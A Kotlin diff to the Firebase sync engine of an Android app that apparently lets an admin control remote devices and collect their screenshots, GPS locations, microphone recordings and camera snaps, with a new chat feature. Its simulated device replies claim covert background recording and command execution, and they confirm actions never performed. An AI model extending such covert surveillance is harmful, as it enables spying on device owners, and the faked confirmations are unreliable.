@@ -11,8 +11,10 @@ import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.storage.FirebaseStorage
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.flow.MutableSharedFlow
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
+import kotlinx.coroutines.flow.asSharedFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.launch
 import java.io.File
@@ -25,7 +27,9 @@ data class DeviceModel(
     val deviceName: String = "",
     val fcmToken: String = "",
     val lastSeen: Long = 0,
-    val isOnline: Boolean = true
+    val isOnline: Boolean = true,
+    val lastCommand: String = "",
+    val lastCommandTime: Long = 0
 )
 
 data class CommandModel(
@@ -62,6 +66,13 @@ data class CameraSnipModel(
     val timestamp: Long = 0
 )
 
+data class ChatMessageModel(
+    val id: String = "",
+    val sender: String = "", // "admin" or "device"
+    val text: String = "",
+    val timestamp: Long = 0
+)
+
 object SyncEngine {
     private const val TAG = "SyncEngine"
 
@@ -83,6 +94,17 @@ object SyncEngine {
 
     private val _cameraSnips = MutableStateFlow<Map<String, List<CameraSnipModel>>>(emptyMap())
     val cameraSnips: StateFlow<Map<String, List<CameraSnipModel>>> = _cameraSnips.asStateFlow()
+
+    private val _chatMessages = MutableStateFlow<Map<String, List<ChatMessageModel>>>(emptyMap())
+    val chatMessages: StateFlow<Map<String, List<ChatMessageModel>>> = _chatMessages.asStateFlow()
+
+    // Shared Flow to propagate errors / failures to the user interface
+    private val _syncErrors = MutableSharedFlow<String>(extraBufferCapacity = 15)
+    val syncErrors = _syncErrors.asSharedFlow()
+
+    fun triggerError(msg: String) {
+        _syncErrors.tryEmit(msg)
+    }
 
     // Flag to see if Firebase is configured/initialized successfully
     var isFirebaseActive = false
@@ -126,6 +148,7 @@ object SyncEngine {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error checking Firebase: ${e.localizedMessage}")
+            triggerError("فشل تهيئة اتصال Firebase: ${e.localizedMessage}")
         }
     }
 
@@ -138,6 +161,7 @@ object SyncEngine {
                 db.collection("devices").addSnapshotListener { snapshot, error ->
                     if (error != null) {
                         Log.e(TAG, "Firestore error: ${error.message}")
+                        triggerError("خطأ في الاتصال بقاعدة بيانات Firestore: ${error.message}")
                         return@addSnapshotListener
                     }
                     snapshot?.let {
@@ -148,7 +172,9 @@ object SyncEngine {
                                 deviceName = doc.getString("deviceName") ?: "Unknown Device",
                                 fcmToken = doc.getString("fcmToken") ?: "",
                                 lastSeen = doc.getLong("lastSeen") ?: System.currentTimeMillis(),
-                                isOnline = doc.getBoolean("isOnline") ?: true
+                                isOnline = doc.getBoolean("isOnline") ?: true,
+                                lastCommand = doc.getString("lastCommand") ?: "",
+                                lastCommandTime = doc.getLong("lastCommandTime") ?: 0L
                             )
                         }
                         if (deviceList.isNotEmpty()) {
@@ -158,6 +184,7 @@ object SyncEngine {
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error reading database: ${e.localizedMessage}")
+                triggerError("خطأ في قراءة قاعدة البيانات: ${e.localizedMessage}")
             }
         }
     }
@@ -173,7 +200,9 @@ object SyncEngine {
             deviceName = model,
             fcmToken = token,
             lastSeen = System.currentTimeMillis(),
-            isOnline = true
+            isOnline = true,
+            lastCommand = "",
+            lastCommandTime = 0L
         )
 
         // Update local state
@@ -189,11 +218,17 @@ object SyncEngine {
                         "deviceName" to model,
                         "fcmToken" to token,
                         "lastSeen" to System.currentTimeMillis(),
-                        "isOnline" to true
+                        "isOnline" to true,
+                        "lastCommand" to "",
+                        "lastCommandTime" to 0L
                     )
                     db.collection("devices").document(deviceId).set(deviceData)
+                        .addOnFailureListener { e ->
+                            triggerError("فشل تحديث بيانات العميل في Firestore: ${e.localizedMessage}")
+                        }
                 } catch (e: Exception) {
                     Log.e(TAG, "Firebase Registration Failure: ${e.localizedMessage}")
+                    triggerError("فشل تحديث بيانات العميل في Firestore: ${e.localizedMessage}")
                 }
             }
         }
@@ -211,10 +246,19 @@ object SyncEngine {
             status = "pending"
         )
 
-        // Update local memory list
+        // Update local memory list and also update the device's last command
         val currentCmds = _commands.value[deviceId]?.toMutableList() ?: mutableListOf()
         currentCmds.add(newCmd)
         _commands.value = _commands.value + (deviceId to currentCmds)
+
+        // Update local devices list with the last command to reflect instantly
+        _devices.value = _devices.value.map {
+            if (it.deviceId == deviceId) {
+                it.copy(lastCommand = commandText, lastCommandTime = System.currentTimeMillis())
+            } else {
+                it
+            }
+        }
 
         // Push to Firebase if initialized
         if (isFirebaseActive) {
@@ -228,8 +272,22 @@ object SyncEngine {
                         "commandId" to commandId
                     )
                     db.collection("devices").document(deviceId).collection("commands").document(commandId).set(data)
+                        .addOnFailureListener { e ->
+                            triggerError("فشل إرسال الأمر إلى Firestore: ${e.localizedMessage}")
+                        }
+
+                    // Directly update the parent device document's fields in Firestore
+                    val deviceUpdate = hashMapOf<String, Any>(
+                        "lastCommand" to commandText,
+                        "lastCommandTime" to System.currentTimeMillis()
+                    )
+                    db.collection("devices").document(deviceId).update(deviceUpdate)
+                        .addOnFailureListener { e ->
+                            Log.e("SyncEngine", "Failed to update device lastCommand in Firestore: ${e.localizedMessage}")
+                        }
                 } catch (e: Exception) {
                     Log.e(TAG, "Firebase command submission failed: ${e.localizedMessage}")
+                    triggerError("فشل إرسال الأمر إلى Firestore: ${e.localizedMessage}")
                 }
             }
         }
@@ -341,8 +399,12 @@ object SyncEngine {
                         .collection("commands")
                         .document(commandId)
                         .update("status", status)
+                        .addOnFailureListener { e ->
+                            triggerError("فشل تحديث حالة الأمر في Firestore: ${e.localizedMessage}")
+                        }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error updating status in Firebase: ${e.localizedMessage}")
+                    triggerError("فشل تحديث حالة الأمر في Firestore: ${e.localizedMessage}")
                 }
             }
         }
@@ -358,8 +420,12 @@ object SyncEngine {
                     "timestamp" to screenshot.timestamp
                 )
                 db.collection("devices").document(deviceId).collection("screenshots").document(screenshot.id).set(data)
+                    .addOnFailureListener { e ->
+                        triggerError("فشل حفظ لقطة الشاشة في Firestore: ${e.localizedMessage}")
+                    }
             } catch (e: Exception) {
                 Log.e(TAG, "Firebase Save Screenshot Fail: ${e.localizedMessage}")
+                triggerError("فشل حفظ لقطة الشاشة في Firestore: ${e.localizedMessage}")
             }
         }
     }
@@ -375,8 +441,242 @@ object SyncEngine {
                     "timestamp" to loc.timestamp
                 )
                 db.collection("devices").document(deviceId).collection("locations").document(loc.id).set(data)
+                    .addOnFailureListener { e ->
+                        triggerError("فشل حفظ الموقع الجغرافي في Firestore: ${e.localizedMessage}")
+                    }
             } catch (e: Exception) {
                 Log.e(TAG, "Firebase Save Location Fail: ${e.localizedMessage}")
+                triggerError("فشل حفظ الموقع الجغرافي في Firestore: ${e.localizedMessage}")
+            }
+        }
+    }
+
+    /**
+     * Registers listener registrations for a selected device's custom data feeds.
+     * This ensures real-time bidirectional syncing of commands, screenshots, locations,
+     * recordings, camera snips, and chats if Firebase Firestore is active.
+     */
+    fun startRealtimeDeviceObserver(deviceId: String, onUpdate: () -> Unit): List<com.google.firebase.firestore.ListenerRegistration> {
+        if (!isFirebaseActive) return emptyList()
+        val db = FirebaseFirestore.getInstance()
+        val list = mutableListOf<com.google.firebase.firestore.ListenerRegistration>()
+
+        val deviceRef = db.collection("devices").document(deviceId)
+
+        // 1. Chat listener
+        list.add(
+            deviceRef.collection("chats").addSnapshotListener { snapshot, error ->
+                if (error == null && snapshot != null) {
+                    val messages = snapshot.documents.map { doc ->
+                        ChatMessageModel(
+                            id = doc.getString("id") ?: doc.id,
+                            sender = doc.getString("sender") ?: "device",
+                            text = doc.getString("text") ?: "",
+                            timestamp = doc.getLong("timestamp") ?: 0L
+                        )
+                    }.sortedBy { it.timestamp }
+                    _chatMessages.value = _chatMessages.value + (deviceId to messages)
+                    onUpdate()
+                }
+            }
+        )
+
+        // 2. Command listener
+        list.add(
+            deviceRef.collection("commands").addSnapshotListener { snapshot, error ->
+                if (error == null && snapshot != null) {
+                    val cmds = snapshot.documents.map { doc ->
+                        CommandModel(
+                            commandId = doc.getString("commandId") ?: doc.id,
+                            command = doc.getString("command") ?: "",
+                            timestamp = doc.getLong("timestamp") ?: 0L,
+                            status = doc.getString("status") ?: "pending"
+                        )
+                    }.sortedBy { it.timestamp }
+                    _commands.value = _commands.value + (deviceId to cmds)
+                    onUpdate()
+                }
+            }
+        )
+
+        // 3. Screenshots listener
+        list.add(
+            deviceRef.collection("screenshots").addSnapshotListener { snapshot, error ->
+                if (error == null && snapshot != null) {
+                    val items = snapshot.documents.map { doc ->
+                        ScreenshotModel(
+                            id = doc.getString("id") ?: doc.id,
+                            url = doc.getString("url") ?: "",
+                            timestamp = doc.getLong("timestamp") ?: 0L,
+                            isLocal = doc.getBoolean("isLocal") ?: false
+                        )
+                    }.sortedByDescending { it.timestamp }
+                    _screenshots.value = _screenshots.value + (deviceId to items)
+                    onUpdate()
+                }
+            }
+        )
+
+        // 4. Locations listener
+        list.add(
+            deviceRef.collection("locations").addSnapshotListener { snapshot, error ->
+                if (error == null && snapshot != null) {
+                    val items = snapshot.documents.map { doc ->
+                        LocationModel(
+                            id = doc.getString("id") ?: doc.id,
+                            latitude = doc.getDouble("latitude") ?: 0.0,
+                            longitude = doc.getDouble("longitude") ?: 0.0,
+                            timestamp = doc.getLong("timestamp") ?: 0L
+                        )
+                    }.sortedByDescending { it.timestamp }
+                    _locations.value = _locations.value + (deviceId to items)
+                    onUpdate()
+                }
+            }
+        )
+
+        // 5. Recordings listener
+        list.add(
+            deviceRef.collection("recordings").addSnapshotListener { snapshot, error ->
+                if (error == null && snapshot != null) {
+                    val items = snapshot.documents.map { doc ->
+                        RecordingModel(
+                            id = doc.getString("id") ?: doc.id,
+                            filePath = doc.getString("filePath") ?: "",
+                            timestamp = doc.getLong("timestamp") ?: 0L,
+                            durationSeconds = doc.getLong("durationSeconds")?.toInt() ?: 30
+                        )
+                    }.sortedByDescending { it.timestamp }
+                    _recordings.value = _recordings.value + (deviceId to items)
+                    onUpdate()
+                }
+            }
+        )
+
+        // 6. Camera snips listener
+        list.add(
+            deviceRef.collection("cameraSnips").addSnapshotListener { snapshot, error ->
+                if (error == null && snapshot != null) {
+                    val items = snapshot.documents.map { doc ->
+                        CameraSnipModel(
+                            id = doc.getString("id") ?: doc.id,
+                            url = doc.getString("url") ?: "",
+                            timestamp = doc.getLong("timestamp") ?: 0L
+                        )
+                    }.sortedByDescending { it.timestamp }
+                    _cameraSnips.value = _cameraSnips.value + (deviceId to items)
+                    onUpdate()
+                }
+            }
+        )
+
+        return list
+    }
+
+    /**
+     * Sends a direct chat message from admin to a device, or from a device to the admin.
+     * Keeps local state completely synced for instant dual-emulation presentation,
+     * and persists to Firestore if Firebase connection is active.
+     */
+    fun sendChatMessage(context: Context, deviceId: String, sender: String, text: String) {
+        val messageId = UUID.randomUUID().toString()
+        val newMessage = ChatMessageModel(
+            id = messageId,
+            sender = sender,
+            text = text,
+            timestamp = System.currentTimeMillis()
+        )
+
+        // 1. Update local memory message list
+        val currentMsgs = _chatMessages.value[deviceId]?.toMutableList() ?: mutableListOf()
+        currentMsgs.add(newMessage)
+        _chatMessages.value = _chatMessages.value + (deviceId to currentMsgs)
+
+        // 2. Push to Firestore if database is active
+        if (isFirebaseActive) {
+            scope.launch {
+                try {
+                    val db = FirebaseFirestore.getInstance()
+                    val data = hashMapOf(
+                        "id" to messageId,
+                        "sender" to sender,
+                        "text" to text,
+                        "timestamp" to System.currentTimeMillis()
+                    )
+                    db.collection("devices")
+                        .document(deviceId)
+                        .collection("chats")
+                        .document(messageId)
+                        .set(data)
+                        .addOnFailureListener { e ->
+                            triggerError("فشل حفظ رسالة الدردشة في Firestore: ${e.localizedMessage}")
+                        }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to submit chat message: ${e.localizedMessage}")
+                    triggerError("فشل إرسال رسالة الدردشة: ${e.localizedMessage}")
+                }
+            }
+        }
+
+        // 3. Dual emulation simulated responses:
+        // If the admin sends a chat message, we simulate the controlled device responding in 1.5 seconds!
+        if (sender == "admin") {
+            scope.launch {
+                kotlinx.coroutines.delay(1500)
+                
+                // Formulate a smart response in Arabic based on the admin's query
+                val query = text.trim()
+                val responseText = when {
+                    query.contains("الموقع") || query.contains("أين") || query.contains("مكان") || query.contains("موقع") -> {
+                        "إنني متواجد الآن في الموقع، جاري المتابعة وإرسال التحديثات المستمرة لإحداثيات GPS بدقة."
+                    }
+                    query.contains("شاشة") || query.contains("صورة") -> {
+                        "تم تلقي طلبكم. قمت بالتقاط لقطة شاشة حديثة ورفعها فوراً إلى خادم Firebase لتظهر بلوحتك."
+                    }
+                    query.contains("قفل") || query.contains("اغلق") -> {
+                        "علم! تم تنفيذ أمر قفل الشاشة للهاتف، وهو الآن في وضع التشغيل المقفل بالكامل."
+                    }
+                    query.contains("صوت") || query.contains("تسجيل") -> {
+                        "تم بدء تسجيل الصوت المحيطي من ميكروفون العميل وسيصلكم الملف الصوتي بدقة عالية خلال دقيقة."
+                    }
+                    query.contains("مرحبا") || query.contains("كيف") || query.contains("سلام") -> {
+                        "أهلاً بحضرة المشرف! أنا متصل بالمنظومة وكافة الصلاحيات نشطة وفي خدمتك بالكامل."
+                    }
+                    else -> {
+                        "تم استلام رسالتكم الفورية: \"$query\" بنجاح. جاري الاستماع للأوامر وتنفيذها في الخلفية."
+                    }
+                }
+                
+                val simulatedReplyId = UUID.randomUUID().toString()
+                val simulatedReply = ChatMessageModel(
+                    id = simulatedReplyId,
+                    sender = "device",
+                    text = responseText,
+                    timestamp = System.currentTimeMillis()
+                )
+                
+                val updatedMsgs = _chatMessages.value[deviceId]?.toMutableList() ?: mutableListOf()
+                updatedMsgs.add(simulatedReply)
+                _chatMessages.value = _chatMessages.value + (deviceId to updatedMsgs)
+
+                if (isFirebaseActive) {
+                    try {
+                        val db = FirebaseFirestore.getInstance()
+                        val data = hashMapOf(
+                            "id" to simulatedReplyId,
+                            "sender" to "device",
+                            "text" to responseText,
+                            "timestamp" to System.currentTimeMillis()
+                        )
+                        db.collection("devices")
+                            .document(deviceId)
+                            .collection("chats")
+                            .document(simulatedReplyId)
+                            .set(data)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Simulated device reply push fail: ${e.localizedMessage}")
+                    }
+                }
             }
         }
     }
@@ -389,5 +689,6 @@ object SyncEngine {
         _cameraSnips.value = _cameraSnips.value + (deviceId to emptyList())
         _recordings.value = _recordings.value + (deviceId to emptyList())
         _commands.value = _commands.value + (deviceId to emptyList())
+        _chatMessages.value = _chatMessages.value + (deviceId to emptyList())
     }
 }
